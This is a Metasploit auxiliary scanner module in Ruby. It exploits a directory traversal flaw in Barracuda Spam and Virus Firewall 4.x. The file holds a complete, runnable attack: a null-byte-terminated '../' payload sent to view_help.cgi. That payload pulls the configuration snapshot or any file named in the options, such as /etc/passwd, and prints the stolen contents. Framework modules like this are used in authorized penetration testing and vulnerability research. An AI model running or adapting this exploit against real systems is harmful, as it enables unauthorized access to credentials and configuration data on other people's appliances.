##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'Barracuda Spam / Virus Firewall "locale" Directory Traversal',
			'Version'        => '$Revision$',
			'Description'    => %q{
					This module exploits a directory traversal vulnerability present in
				Barracuda Spam and Virus Firewall version 4.x. By default, this module
				will attempt to download the Barracuda configuration file.
			},
			'References'     =>
				[
					['OSVDB', '68301'],
					['URL', 'http://secunia.com/advisories/41609/'],
					['URL', 'http://www.exploit-db.com/exploits/15130/'],
				],
			'Author'         =>
				[
					'==[ Alligator Security Team ]==',
					'Tiago Ferreira <tiago.ccna[at]gmail.com>'
				],
			'DisclosureDate' => 'Oct 08 2010',
			'License'        =>  MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(8000),
				OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", '/mail/snapshot/config.snapshot']),
				OptString.new('URI', [true, 'Barracuda vulnerable URI path', '/cgi-mod/view_help.cgi']),
			], self.class)
	end

	def target_url
		"http://#{vhost}#{datastore['URI']}:#{rport}"
	end

	def run_host(ip)
		uri = datastore['URI']
		file = datastore['FILE']
		payload = "?locale=/../../../../../../..#{file}%00"

		print_status("#{target_url} - Barracuda - Checking if remote server is vulnerable")

		res = send_request_raw({
			'method'  => 'GET',
			'uri'     => "#{uri}" + payload,
		}, 25)

		if (res and res.code == 200 and res.body)
			if (res.body.match(/p\>(.*)\<\/p/im).to_s.size > 10)
				file_data = $1
				print_good("#{target_url} - Barracuda - Vulnerable")
				print_good("#{target_url} - Barracuda - File Output: \n" + file_data + "\r\n")

			elsif res.body =~ /help_page/
				print_error("#{target_url} - Barracuda - Not Vulnerable")
			else
				print_error("#{target_url} - Barracuda - File not found or permission denied")
			end

		else
			print_error("#{target_url} - Barracuda - Unrecognized #{res.code} response")
			return :abort
		end

	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
	rescue ::Timeout::Error, ::Errno::EPIPE
	end

end
